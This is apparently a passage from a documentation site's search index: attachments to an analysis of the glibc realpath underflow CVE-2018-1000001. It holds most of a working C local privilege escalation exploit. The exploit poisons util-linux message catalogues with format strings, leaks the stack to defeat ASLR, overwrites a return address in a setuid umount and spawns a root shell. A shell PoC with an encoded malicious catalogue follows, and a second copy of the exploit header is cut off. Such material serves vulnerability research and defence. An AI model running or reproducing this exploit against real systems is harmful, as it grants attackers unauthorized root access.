if(namespacedProcessPid==-1) {\n    fprintf(stderr, \"No pid supplied via command line, trying to create a namespace\\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\\n\");\n\n\n    char *stackData=(char*)malloc(1<<20);\n    assert(stackData);\n    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),\n        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);\n    if(namespacedProcessPid==-1) {\n      fprintf(stderr, \"USERNS clone failed: %d (%s)\\n\", errno, strerror(errno));\n      return(-1);\n    }\n\n\n    char idMapFileName[128];\n    char idMapData[128];\n    sprintf(idMapFileName, \"/proc/%d/setgroups\", namespacedProcessPid);\n    int setGroupsFd=open(idMapFileName, O_WRONLY);\n    assert(setGroupsFd>=0);\n    int result=write(setGroupsFd, \"deny\", 4);\n    assert(result>0);\n    close(setGroupsFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/uid_map\", namespacedProcessPid);\n    int uidMapFd=open(idMapFileName, O_WRONLY);\n    assert(uidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getuid());\n    result=write(uidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(uidMapFd);\n\n\n    sprintf(idMapFileName, \"/proc/%d/gid_map\", namespacedProcessPid);\n    int gidMapFd=open(idMapFileName, O_WRONLY);\n    assert(gidMapFd>=0);\n    sprintf(idMapData, \"0 %d 1\\n\", getgid());\n    result=write(gidMapFd, idMapData, strlen(idMapData));\n    assert(result>0);\n    close(gidMapFd);\n\n\n// After setting the maps for the child process, the child may\n// start setting up the mount point. Wait for that to complete.\n    sleep(1);\n    fprintf(stderr, \"Namespaced filesystem created with pid %d\\n\",\n        namespacedProcessPid);\n  }\n\n\n//   osReleaseExploitData=osSpecificExploitDataList;\n//   if(osRelease) {\n// // If an OS was detected, try to find it in list. Otherwise use\n// // default.\n//     for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {\n//       if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {\n//         osReleaseExploitData=osSpecificExploitDataList+tPos;\n//         break;\n//       }\n//     }\n//   }\n  osReleaseExploitData = osSpecificExploitDataList;\n\n\n  char pathBuffer[PATH_MAX];\n  int result=snprintf(pathBuffer, sizeof(pathBuffer), \"/proc/%d/cwd\",\n     namespacedProcessPid);\n  assert(result<PATH_MAX);\n  char *namespaceMountBaseDir=strdup(pathBuffer);\n  assert(namespaceMountBaseDir);\n\n\n// Create directories needed for umount to proceed to final state\n// \"not mounted\".\n  createDirectoryRecursive(namespaceMountBaseDir, \"(unreachable)/x\");\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES\", osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.X/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"(unreachable)/tmp/%s/X.x/LC_MESSAGES\", osReleaseExploitData[2]);\n  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);\n\n\n// Create symlink to trigger underflows.\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/(unreachable)/tmp/down\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  result=symlink(osReleaseExploitData[1], pathBuffer);\n  assert(!result||(errno==EEXIST));\n\n\n// getdate will leave that string in rdi to become the filename\n// to execute for the next round.\n  char *selfPathName=realpath(\"/proc/self/exe\", NULL);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/DATEMSK\",\n      namespaceMountBaseDir);\n  assert(result<PATH_MAX);\n  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);\n  assert(handle>0);\n  result=snprintf(pathBuffer, sizeof(pathBuffer), \"#!%s\\nunused\",\n      selfPathName);\n  assert(result<PATH_MAX);\n  result=write(handle, pathBuffer, result);\n  close(handle);\n  free(selfPathName);\n\n\n// Write the initial message catalogue to trigger stack dumping\n// and to make the \"umount\" call privileged by toggling the \"restricted\"\n// flag in the context.\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n\n\n  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));\n  assert(stackDumpStr);\n  char *stackDumpStrEnd=stackDumpStr;\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"AA%%%d$lnAAAAAA\",\n      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);\n  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {\n    memcpy(stackDumpStrEnd, \"%016lx\", 6);\n    stackDumpStrEnd+=6;\n  }\n// We wrote allready 8 bytes, write so many more to produce a\n// count of 'L' and write that to the stack. As all writes so\n// sum up to a count aligned by 8, and 'L'==0x4c, we will have\n// to write at least 4 bytes, which is longer than any \"%hhx\"\n// format string output. Hence do not care about the byte content\n// here. The target write address has a 16 byte alignment due\n// to varg structure.\n  stackDumpStrEnd+=sprintf(stackDumpStrEnd, \"%%1$%dhhx%%%d$hhn\",\n      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,\n      STACK_LONG_DUMP_BYTES/16);\n  *stackDumpStrEnd=0;\n  result=writeMessageCatalogue(pathBuffer,\n      (char*[]){\n          \"%s: mountpoint not found\",\n          \"%s: not mounted\",\n          \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n      },\n      (char*[]){\"1234\", stackDumpStr, \"5678\"},\n      3);\n  assert(!result);\n  free(stackDumpStr);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  assert(result<PATH_MAX);\n  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);\n  assert((!result)||(errno==EEXIST));\n  secondPhaseTriggerPipePathname=strdup(pathBuffer);\n\n\n  result=snprintf(pathBuffer, sizeof(pathBuffer),\n      \"%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo\",\n      namespaceMountBaseDir, osReleaseExploitData[2]);\n  secondPhaseCataloguePathname=strdup(pathBuffer);\n\n\n  free(namespaceMountBaseDir);\n  return(namespacedProcessPid);\n}\n\n\n\n\n\n\n/** Create the format string to write an arbitrary value to the\n *  stack. The created format string avoids to interfere with\n *  the complex fprintf format handling logic by accessing fprintf\n *  internal state on stack. Thus the modification method does\n *  not depend on that ftp internals. The current libc fprintf\n *  implementation copies values for formatting before applying\n *  the %n writes, therefore pointers changed by fprintf operation\n *  can only be utilized with the next fprintf invocation. As\n *  we cannot rely on a stack having a suitable number of pointers\n *  ready for arbitrary writes, we need to create those pointers\n *  one by one. Everything needed is pointer on stack pointing\n *  to another valid pointer and 4 helper pointers pointing to\n *  writeable memory. The **argv list matches all those requirements.\n *  @param printfArgvValuePos the position of the argv pointer from\n *  printf format string view.\n *  @param argvStackAddress the address of the argv list, where\n *  the argv[0] pointer can be read.\n *  @param printfArg0ValuePos the position of argv list containing\n *  argv[0..n] pointers.\n *  @param mainFunctionReturnAddress the address on stack where\n *  the return address from the main() function to _libc_start()\n *  is stored.\n *  @param writeValue the value to write to mainFunctionReturnAddress\n */\nvoid createStackWriteFormatString(\n    char *formatBuffer, int bufferSize, int printfArgvValuePos,\n    void *argvStackAddress, int printfArg0ValuePos,\n    void *mainFunctionReturnAddress, unsigned short *writeData,\n    int writeDataLength) {\n  int result=0;\n  int currentValue=-1;\n  for(int nextWriteValue=0; nextWriteValue<0x10000;) {\n// Find the lowest value to write.\n    nextWriteValue=0x10000;\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       int value=writeData[valuePos];\n       if((value>currentValue)&&(value<nextWriteValue))\n         nextWriteValue=value;\n    }\n    if(currentValue<0)\n      currentValue=0;\n    if(currentValue!=nextWriteValue) {\n      result=snprintf(formatBuffer, bufferSize, \"%%1$%1$d.%1$ds\",\n          nextWriteValue-currentValue);\n      formatBuffer+=result;\n      bufferSize-=result;\n      currentValue=nextWriteValue;\n    }\n    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {\n       if(writeData[valuePos]==nextWriteValue) {\n          result=snprintf(formatBuffer, bufferSize,\n              \"%%%d$hn\", printfArg0ValuePos+valuePos+1);\n          formatBuffer+=result;\n          bufferSize-=result;\n       }\n    }\n  }\n\n\n// Print the return function address location number of bytes\n// except 8 (those from the LABEL counter) and write the value\n// to arg1.\n  int writeCount=((long long)mainFunctionReturnAddress-18)&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$%d.%ds%%1$s%%1$s%%%d$hn\",\n      writeCount, writeCount, printfArg0ValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Write the LABEL 6 more times, thus multiplying the the single\n// byte write pointer to an 8-byte aligned argv-list pointer and\n// update argv[0] to point to argv[1..n].\n  writeCount=(((long long)argvStackAddress)-(writeCount+56))&0xffff;\n  result=snprintf(formatBuffer, bufferSize,\n      \"%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn\",\n      writeCount, writeCount, printfArgvValuePos);\n  formatBuffer+=result;\n  bufferSize-=result;\n\n\n// Append a debugging preamble.\n  result=snprintf(formatBuffer, bufferSize, \"-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\\n\",\n      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,\n      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,\n      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);\n  formatBuffer+=result;\n  bufferSize-=result;\n}\n\n\n\n\n/** Wait for the trigger pipe to open. The pipe will be closed\n *  immediately after opening it.\n *  @return 0 when the pipe was opened before hitting a timeout.\n */\nint waitForTriggerPipeOpen(char *pipeName) {\n  struct timespec startTime, currentTime;\n  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);\n  startTime.tv_sec+=10;\n  assert(!result);\n  while(1) {\n    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);\n    if(pipeFd>=0) {\n      close(pipeFd);\n      break;\n    }\n    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);\n    if(currentTime.tv_sec>startTime.tv_sec) {\n      return(-1);\n    }\n    currentTime.tv_sec=0;\n    currentTime.tv_nsec=100000000;\n    nanosleep(&currentTime, NULL);\n  }\n  return(0);\n}\n\n\n\n\n/** Invoke umount to gain root privileges.\n *  @return 0 if the umount process terminated with expected exit\n *  status.\n */\nint attemptEscalation() {\n  int escalationSuccess=-1;\n\n\n  char targetCwd[64];\n  snprintf(\n      targetCwd, sizeof(targetCwd)-1, \"/proc/%d/cwd\", namespacedProcessPid);\n\n\n  int pipeFds[2];\n  int result=pipe(pipeFds);\n  assert(!result);\n\n\n  pid_t childPid=fork();\n  assert(childPid>=0);\n  if(!childPid) {\n// This is the child process.\n    close(pipeFds[0]);\n    fprintf(stderr, \"Starting subprocess\\n\");\n    dup2(pipeFds[1], 1);\n    dup2(pipeFds[1], 2);\n    close(pipeFds[1]);\n    result=chdir(targetCwd);\n    assert(!result);\n\n\n// Create so many environment variables for a kind of \"stack spraying\".\n    int envCount=UMOUNT_ENV_VAR_COUNT;\n    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));\n    assert(umountEnv);\n    umountEnv[envCount--]=NULL;\n    umountEnv[envCount--]=\"LC_ALL=C.UTF-8\";\n    while(envCount>=0) {\n      umountEnv[envCount--]=\"AANGUAGE=X.X\";\n    }\n// Use the built-in C locale.\n// Invoke umount first by overwriting heap downwards using links\n// for \"down\", then retriggering another error message (\"busy\")\n// with hopefully similar same stack layout for other path \"/run\".\n// The path \"/\" cannot be used as it is registered in \"/run/mount/utab\"\n// on standard desktop Xenial installs, thus triggering different\n// code path.\n    char* umountArgs[]={umountPathname, \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"/run\", \"down\", \"LABEL=78\", \"LABEL=789\", \"LABEL=789a\", \"LABEL=789ab\", \"LABEL=789abc\", \"LABEL=789abcd\", \"LABEL=789abcde\", \"LABEL=789abcdef\", \"LABEL=789abcdef0\", \"LABEL=789abcdef0\", NULL};\n    result=execve(umountArgs[0], umountArgs, umountEnv);\n    assert(!result);\n  }\n  close(pipeFds[1]);\n  int childStdout=pipeFds[0];\n\n\n  int escalationPhase=0;\n  char readBuffer[1024];\n  int readDataLength=0;\n  char stackData[STACK_LONG_DUMP_BYTES];\n  int stackDataBytes=0;\n\n\n  struct pollfd pollFdList[1];\n  pollFdList[0].fd=childStdout;\n  pollFdList[0].events=POLLIN;\n\n\n// Now learn about the binary, prepare data for second exploitation\n// phase. The phases should be:\n// * 0: umount executes, glibc underflows and causes an util-linux.mo\n//   file to be read, that contains a poisonous format string.\n//   Successful poisoning results in writing of 8*'A' preamble,\n//   we are looking for to indicate end of this phase.\n// * 1: The poisoned process writes out stack content to defeat\n//   ASLR. Reading all relevant stack end this phase.\n// * 2: The poisoned process changes the \"LANGUAGE\" parameter,\n//   thus triggering re-read of util-linux.mo. To avoid races,\n//   we let umount open a named pipe, thus blocking execution.\n//   As soon as the pipe is ready for writing, we write a modified\n//   version of util-linux.mo to another file because the pipe\n//   cannot be used for sending the content.\n// * 3: We read umount output to avoid blocking the process and\n//   wait for it to ROP execute fchown/fchmod and exit.\n  while(1) {\n    if(escalationPhase==2) {\n// We cannot use the standard poll from below to monitor the pipe,\n// but also we do not want to block forever. Wait for the pipe\n// in nonblocking mode and then continue with next phase.\n      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);\n      if(result) {\n        goto attemptEscalationCleanup;\n      }\n      escalationPhase++;\n    }\n\n\n// Wait at most 10 seconds for IO.\n    result=poll(pollFdList, 1, 10000);\n    if(!result) {\n// We ran into a timeout. This might be the result of a deadlocked\n// child, so kill the child and retry.\n      fprintf(stderr, \"Poll timed out\\n\");\n      goto attemptEscalationCleanup;\n    }\n// Perform the IO operations without blocking.\n    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {\n      result=read(\n          pollFdList[0].fd, readBuffer+readDataLength,\n          sizeof(readBuffer)-readDataLength);\n      if(!result) {\n        if(escalationPhase<3) {\n// Child has closed the socket unexpectedly.\n          goto attemptEscalationCleanup;\n        }\n        break;\n      }\n      if(result<0) {\n        fprintf(stderr, \"IO error talking to child\\n\");\n        goto attemptEscalationCleanup;\n      }\n      readDataLength+=result;\n\n\n// Handle the data depending on escalation phase.\n      int moveLength=0;\n      switch(escalationPhase) {\n        case 0: // Initial sync: read A*8 preamble.\n          if(readDataLength<8)\n            continue;\n          char *preambleStart=memmem(readBuffer, readDataLength,\n              \"AAAAAAAA\", 8);\n          if(!preambleStart) {\n// No preamble, move content only if buffer is full.\n            if(readDataLength==sizeof(readBuffer))\n              moveLength=readDataLength-7;\n            break;\n          }\n// We found, what we are looking for. Start reading the stack.\n          escalationPhase++;\n          moveLength=preambleStart-readBuffer+8;\n        case 1: // Read the stack.\n// Consume stack data until or local array is full.\n          while(moveLength+16<=readDataLength) {\n            result=sscanf(readBuffer+moveLength, \"%016lx\",\n                (long*)(stackData+stackDataBytes));\n            if(result!=1) {\n// Scanning failed, the data injection procedure apparently did\n// not work, so this escalation failed.\n              goto attemptEscalationCleanup;\n            }\n            moveLength+=sizeof(long)*2;\n            stackDataBytes+=sizeof(long);\n// See if we reached end of stack dump already.\n            if(stackDataBytes==sizeof(stackData))\n              break;\n          }\n          if(stackDataBytes!=sizeof(stackData))\n            break;\n\n\n// All data read, use it to prepare the content for the next phase.\n          fprintf(stderr, \"Stack content received, calculating next phase\\n\");\n\n\n          int *exploitOffsets=(int*)osReleaseExploitData[3];\n\n\n// This is the address, where source Pointer is pointing to.\n          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];\n// This is the stack address source for the target pointer.\n          void *sourcePointerLocation=sourcePointerTarget-0xd0;\n\n\n          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];\n// This is the stack address of the libc start function return\n// pointer.\n          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;\n          fprintf(stderr, \"Found source address location %p pointing to target address %p with value %p, libc offset is %p\\n\",\n              sourcePointerLocation, sourcePointerTarget,\n              targetPointerTarget, libcStartFunctionReturnAddressSource);\n// So the libcStartFunctionReturnAddressSource is the lowest address\n// to manipulate, targetPointerTarget+...\n\n\n          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];\n          void *stackWriteData[]={\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],\n              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]\n          };\n          fprintf(stderr, \"Changing return address from %p to %p, %p\\n\",\n              libcStartFunctionAddress, stackWriteData[0],\n              stackWriteData[1]);\n          escalationPhase++;\n\n\n          char *escalationString=(char*)malloc(1024);\n          createStackWriteFormatString(\n              escalationString, 1024,\n              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf\n              sourcePointerTarget, // Base value to write\n              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...\n              libcStartFunctionReturnAddressSource,\n              (unsigned short*)stackWriteData,\n              sizeof(stackWriteData)/sizeof(unsigned short)\n          );\n          fprintf(stderr, \"Using escalation string %s\", escalationString);\n\n\n          result=writeMessageCatalogue(\n              secondPhaseCataloguePathname,\n              (char*[]){\n                  \"%s: mountpoint not found\",\n                  \"%s: not mounted\",\n                  \"%s: target is busy\\n        (In some cases useful info about processes that\\n         use the device is found by lsof(8) or fuser(1).)\"\n              },\n              (char*[]){\n                  escalationString,\n                  \"BBBB5678%3$s\\n\",\n                  \"BBBBABCD%s\\n\"},\n              3);\n          assert(!result);\n          break;\n        case 2:\n        case 3:\n// Wait for pipe connection and output any result from mount.\n          readDataLength=0;\n          break;\n        default:\n          fprintf(stderr, \"Logic error, state %d\\n\", escalationPhase);\n          goto attemptEscalationCleanup;\n      }\n      if(moveLength) {\n        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);\n        readDataLength-=moveLength;\n      }\n    }\n  }\n\n\nattemptEscalationCleanup:\n// Wait some time to avoid killing umount even when exploit was\n// successful.\n  sleep(1);\n  close(childStdout);\n// It is safe to kill the child as we did not wait for it to finish\n// yet, so at least the zombie process is still here.\n  kill(childPid, SIGKILL);\n  pid_t waitedPid=waitpid(childPid, NULL, 0);\n  assert(waitedPid==childPid);\n\n\n  return(escalationSuccess);\n}\n\n\n\n\n/** This function invokes the shell specified via environment\n *  or the default shell \"/bin/sh\" when undefined. The function\n *  does not return on success.\n *  @return -1 on error\n */\nint invokeShell(char *shellName) {\n  if(!shellName)\n    shellName=getenv(\"SHELL\");\n  if(!shellName)\n    shellName=\"/bin/sh\";\n  char* shellArgs[]={shellName, NULL};\n  execve(shellName, shellArgs, environ);\n  fprintf(stderr, \"Failed to launch shell %s\\n\", shellName);\n  return(-1);\n}\n\n\nint main(int argc, char **argv) {\n  char *programmName=argv[0];\n  int exitStatus=1;\n\n\n  if(getuid()==0) {\n    fprintf(stderr, \"%s: you are already root, invoking shell ...\\n\",\n        programmName);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  if(geteuid()==0) {\n    struct stat statBuf;\n    int result=stat(\"/proc/self/exe\", &statBuf);\n    assert(!result);\n    if(statBuf.st_uid||statBuf.st_gid) {\n      fprintf(stderr, \"%s: internal invocation, setting SUID mode\\n\",\n          programmName);\n      int handle=open(\"/proc/self/exe\", O_RDONLY);\n      fchown(handle, 0, 0);\n      fchmod(handle, 04755);\n      exit(0);\n    }\n\n\n    fprintf(stderr, \"%s: invoked as SUID, invoking shell ...\\n\",\n        programmName);\n    setresgid(0, 0, 0);\n    setresuid(0, 0, 0);\n    invokeShell(NULL);\n    return(1);\n  }\n\n\n  for(int argPos=1; argPos<argc;) {\n    char *argName=argv[argPos++];\n    if(argPos==argc) {\n      fprintf(stderr, \"%s requires parameter\\n\", argName);\n      return(1);\n    }\n    if(!strcmp(\"--Pid\", argName)) {\n      char *endPtr;\n      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);\n      if((errno)||(*endPtr)) {\n        fprintf(stderr, \"Invalid pid value\\n\");\n        return(1);\n      }\n      killNamespacedProcessFlag=0;\n    } else {\n      fprintf(stderr, \"Unknown argument %s\\n\", argName);\n      return(1);\n    }\n  }\n\n\n  fprintf(stderr, \"%s: setting up environment ...\\n\", programmName);\n\n\n  if(!osRelease) {\n    if(detectOsRelease()) {\n      fprintf(stderr, \"Failed to detect OS version, continuing anyway\\n\");\n    }\n  }\n\n\n  umountPathname=findUmountBinaryPathname(\"/bin\");\n  if((!umountPathname)&&(getenv(\"PATH\")))\n    umountPathname=findUmountBinaryPathname(getenv(\"PATH\"));\n  if(!umountPathname) {\n    fprintf(stderr, \"Failed to locate \\\"umount\\\" binary, is PATH correct?\\n\");\n    goto preReturnCleanup;\n  }\n  fprintf(stderr, \"%s: using umount at \\\"%s\\\".\\n\", programmName,\n      umountPathname);\n\n\n  pid_t nsPid=prepareNamespacedProcess();\n  if(nsPid<0) {\n    goto preReturnCleanup;\n  }\n\n\n// Gaining root can still fail due to ASLR creating additional\n// path separators in memory addresses residing in area to be\n// overwritten by buffer underflow. Retry regaining until this\n// executable changes uid/gid.\n  int escalateMaxAttempts=10;\n  int excalateCurrentAttempt=0;\n  while(excalateCurrentAttempt<escalateMaxAttempts) {\n    excalateCurrentAttempt++;\n    fprintf(stderr, \"Attempting to gain root, try %d of %d ...\\n\",\n        excalateCurrentAttempt, escalateMaxAttempts);\n\n\n    attemptEscalation();\n\n\n    struct stat statBuf;\n    int statResult=stat(\"/proc/self/exe\", &statBuf);\n       int stat(const char *pathname, struct stat *buf);\n    if(statResult) {\n      fprintf(stderr, \"Failed to stat /proc/self/exe: /proc not mounted, access restricted, executable deleted?\\n\");\n      break;\n    }\n    if(statBuf.st_uid==0) {\n      fprintf(stderr, \"Executable now root-owned\\n\");\n      goto escalateOk;\n    }\n  }\n\n\n  fprintf(stderr, \"Escalation FAILED, maybe target system not (yet) supported by exploit!\\n\");\n\n\npreReturnCleanup:\n  if(namespacedProcessPid>0) {\n    if(killNamespacedProcessFlag) {\n      kill(namespacedProcessPid, SIGKILL);\n    } else {\n// We used an existing namespace or chroot to escalate. Remove\n// the files created there.\n      fprintf(stderr, \"No namespace cleanup for preexisting namespaces yet, do it manually.\\n\");\n    }\n  }\n\n\n  if(!exitStatus) {\n    fprintf(stderr, \"Cleanup completed, re-invoking binary\\n\");\n    invokeShell(\"/proc/self/exe\");\n    exitStatus=1;\n  }\n  return(exitStatus);\n\n\nescalateOk:\n  exitStatus=0;\n  goto preReturnCleanup;\n}",
            "title": "Cve 2018 1000001 \u9644\u4ef6"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u9644\u4ef6/#glibccve-2018-1000001",
            "text": "",
            "title": "Glibc\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(CVE-2018-1000001)"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u9644\u4ef6/#poc",
            "text": "# Line 1\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n# Line 2-5\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n\n# Line 6-9\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\necho \"$$\"\n2299\n\n\n# Line 10-11\ntest$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\numount: AAlnAAAAAAAAAAA",
            "title": "poc\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u9644\u4ef6/#exp",
            "text": "/** This software is provided by the copyright owner \"as is\"\n *  and without any expressed or implied warranties, including,\n *  but not limited to, the implied warranties of merchantability\n *  and fitness for a particular purpose are disclaimed. In no\n *  event shall the copyright owner be liable for any direct,\n *  indirect, incidential, special, exemplary or consequential\n *  damages, including, but not limited to, procurement of substitute\n *  goods or services, loss of use, data or profits or business\n *  interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including\n *  negligence or otherwise, arising in any way out of the use\n *  of this software, even if advised of the possibility of such\n *  damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n *\n *  Revisions:\n *  * 20180722: Fixed escalation failure on Xenial desktop install\n *    related to definition of \"/\" in \"/run/mount/utab\". Also\n *    fixed compiler warnings.\n */\n\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\n\nint killNamespacedProcessFlag=1;\n\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as the catalogue cannot be sent via the trigger\n *  pipe from above.\n */\nchar *secondPhaseCataloguePathname;\n\n\n/** The OS-release detected via /etc/os-release. */\nchar *osRelease=NULL;\n\n\n/** This table contains all relevant information to adapt the\n *  attack to supported Linux distros (fully updated) to support\n *  also older versions, hash of umount/libc/libmount should be\n *  used also for lookups.\n *  The 4th string is an array of 4-byte integers, that are addressed\n *  using the \"ED_...\" constants.\n */\n// Stack offset of libmount ctx pointer when addressing it via\n// printf format string argument skipping syntax, thus causing\n// 8 byte words to be skipped when incrementing by one.\n#define ED_STACK_OFFSET_CTX 0\n// Format string argument skipping for argv array.\n#define ED_STACK_OFFSET_ARGV 1\n// Format string argument skipping for argv[0].\n#define ED_STACK_OFFSET_ARG0 2\n// Delta of getdate() function from __libc_start_main position\n// after return from main().\n#define ED_LIBC_GETDATE_DELTA 3\n// Delta of execl() function from __libc_start_main ...\n#define ED_LIBC_EXECL_DELTA 4\nstatic char* osSpecificExploitDataList[]={\n// Debian Stretch\n    \"\\\"9 (stretch)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"__gconv_find_shlib\",\n    